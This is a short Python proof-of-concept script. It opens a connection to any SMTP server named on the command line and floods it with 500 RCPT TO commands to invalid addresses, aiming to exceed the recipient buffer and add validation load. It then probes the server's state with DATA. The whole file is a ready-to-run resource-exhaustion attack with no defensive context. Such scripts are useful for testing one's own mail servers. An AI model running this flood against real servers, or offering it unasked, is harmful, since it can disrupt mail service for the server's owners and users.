#!/usr/bin/env python3
import socket
import sys
import time

def send_command(sock, command):
    """Send an SMTP command and return the server's response."""
    sock.sendall((command + '\r\n').encode('utf-8'))
    response = sock.recv(1024).decode('utf-8')
    return response

def main():
    if len(sys.argv) != 3:
        print("Usage: python poc_smtp_rcpt_flood.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_recipients = 500  # Exceeds the RFC 5321 minimum buffer of 100

    print(f"[*] Connecting to SMTP server at {target_ip}:{target_port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
        sys.exit(1)

    # Step 1: Receive initial banner
    banner = sock.recv(1024).decode('utf-8')
    print(f"[+] Server Banner: {banner.strip()}")

    # Step 2: Send EHLO
    ehlo_resp = send_command(sock, "EHLO poc.example.com")
    print(f"[+] EHLO Response: {ehlo_resp.strip()}")

    # Step 3: Send MAIL FROM
    mail_from_resp = send_command(sock, "MAIL FROM:<attacker@example.com>")
    print(f"[+] MAIL FROM Response: {mail_from_resp.strip()}")

    # Step 4: Send massive number of RCPT TO commands
    print(f"[*] Sending {num_recipients} RCPT TO commands...")
    start_time = time.time()
    for i in range(num_recipients):
        # Using non-existent addresses to trigger validation overhead
        rcpt_resp = send_command(sock, f"RCPT TO:<nonexistent{i}@invalid-domain.com>")
        # Optional: Print progress or specific responses if needed
        if i % 100 == 0:
            print(f"[+] Sent {i} RCPT TO commands...")
    end_time = time.time()

    print(f"[*] Finished sending RCPT TO commands in {end_time - start_time:.2f} seconds.")

    # Step 5: Observe outcome
    print("[*] Attempting to send DATA command to observe server state...")
    data_resp = send_command(sock, "DATA")
    print(f"[+] DATA Response: {data_resp.strip()}")

    # Cleanup
    sock.close()
    print("[*] Connection closed.")

if __name__ == "__main__":
    main()